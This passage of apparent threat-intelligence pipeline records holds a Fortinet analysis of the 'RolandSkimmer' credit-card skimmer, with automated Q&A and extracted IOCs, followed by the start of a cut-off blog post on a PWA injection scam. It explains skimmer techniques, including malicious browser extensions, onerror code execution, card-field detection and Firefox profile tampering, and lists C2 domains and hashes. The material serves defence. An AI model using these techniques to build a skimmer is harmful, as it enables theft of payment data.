user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users through malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer threat steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["browser", "analysis", "apt", "malicious", "threat", "bank", "botnet", "intelligence", "phishing", "banking trojan"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://cside.dev/blog/chinese-adult-content-scam-targets-mobile-users-through-pwa-injection", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "It involves a Progressive Web App (PWA) injection campaign, specifically a Chinese adult-content PWA scam that targets mobile users through third-party JavaScript injection.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to redirect mobile users to a Chinese adult-content PWA scam.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://cside.dev/blog/chinese-adult-content-scam-targets-mobile-users-through-pwa-injection", "error": "unexpected '{' in field name", "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "hxxps://xjdm166[.]com/html/#/i/home"}, {"type": "Domain or URL", "value": "xxsmad6[.]com"}, {"type": "Domain or URL", "value": "xjdm166[.]com"}, {"type": "Domain or URL", "value": "toutiaoimg[.]com"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/yn2k0ypd"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/r42r7opq"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/mqp10w2x"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/z32x7npd"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/1dpy76pv"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/oq5dd058"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/q5o9gx5w"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/l50dx72e"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/32xdq1pd"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/92qlr9pn"}, {"type": "Domain or URL", "value": "hxxps://xxsmad6[.]com/s.php?g=1&t=2&p=1388&i="}, {"type": "Domain or URL", "value": "hxxps://xjdm166[.]com/html/?p=1388"}, {"type": "Domain or URL", "value": "hxxps://xxsmad6[.]com/static/union/images/b-5.png"}, {"type": "Domain or URL", "value": "hxxps://p3-sign.toutiaoimg[.]com"}, {"type": "Domain or URL", "value": "hxxps://xxsmad6[.]com/static/union/images/close.png"}], "mitre_ttps": null, "keywords_found": ["analysis", "fraud", "malicious", "phishing", "browser"], "article_textual_content": "# Stop Fraudulent Job Applications Before They Enter Your Funnel\n\n- Industries\n- Compare\n- Pricing\n- Blog\n- Partners\n- About\n\nBook a demo\n\nLogin\n\nGet started\n\nBack to blog\n\n# Chinese Adult Content Scam Targets Mobile Users Through PWA Injection\n\n### Tuesday, May 20th, 2025\n\nH\n\n### Himanshu Anand\n\nWe’ve identified a fresh injection campaign abusing third-party JavaScript to redirect mobile users to a Chinese adult-content PWA scam.\n\nExample (NSFW): hxxps://xjdm166[.]com/html/#/i/home\n\nWhile the payload itself is nothing new (yet another adult gambling scam), the delivery method stands out. The malicious landing page is a full-blown Progressive Web App (PWA), likely aiming to retain users longer and bypass basic browser protections.\n\nPWAs are often ignored within the client-side security space. Yet, any browser-based delivery is susceptible to these kinds of vulnerabilities.\n\n## What’s happening:\n\n1. Mobile-Only Targeting: The script filters out desktop users, focusing attacks on mobile devices.\n2. Viewport Injection: If the compromised page lacks a viewport meta tag, it injects one to ensure proper mobile rendering.\n3. Ad Overlay Injection :\n    - A dark semi-transparent overlay is added.\n    - An image is fetched from toutiaoimg[.]com to act as the main visual.\n    - A close button image is added — but clicking it triggers a redirect.\n4. Click Hijacking :\n    - Clicking either the main image or the fake close button opens the PWA scam site in a new tab.\n    - Classic bait-and-switch.\n5. External Resources Loaded :\n    - xxsmad6[.]com (main loader and assets)\n    - xjdm166[.]com (final landing scam site)\n    - toutiaoimg[.]com (disguising as a legitimate image host)\n\n## PWAs attacks are on the rise\n\n- The use of PWAs suggests attackers are experimenting with more persistent phishing methods.\n- The mobile-only focus allows them to evade many detection mechanisms.\n- This is yet another variation of the Chinese adult gambling injection campaigns we’ve seen in recent months, but with a new delivery tactic.\n\n## Compromised websites: disguised as novel reading platforms\n\n```\n<title>海棠文学网_好看的小说_小说排行榜_最全的小说阅读网</title>  \n<title>神马小说网 - 最好看的免费小说阅读网</title>  \n<title>78小说网_书友最值得收藏!</title>  \n<title>寂寞书屋 - 纯净阅读,无弹窗广告干扰</title>\n```\n\nTranslated:\n\n```\n<title>Haitang Literature Network_Good novels_Novel rankings_The most comprehensive novel reading network</title>\n\n<title>Shenma Novel Network - The best free novel reading network</title>\n\n<title>78 Novel Network_Book friends are most worthy of collection!</title>\n\n<title>Lonely Book House - Pure reading, no pop-up ads</title>\n```\n\nIn the old TTP, the following websites were injected:\n\nold TTP\n\nIn the new TTP we found the code is encrypted 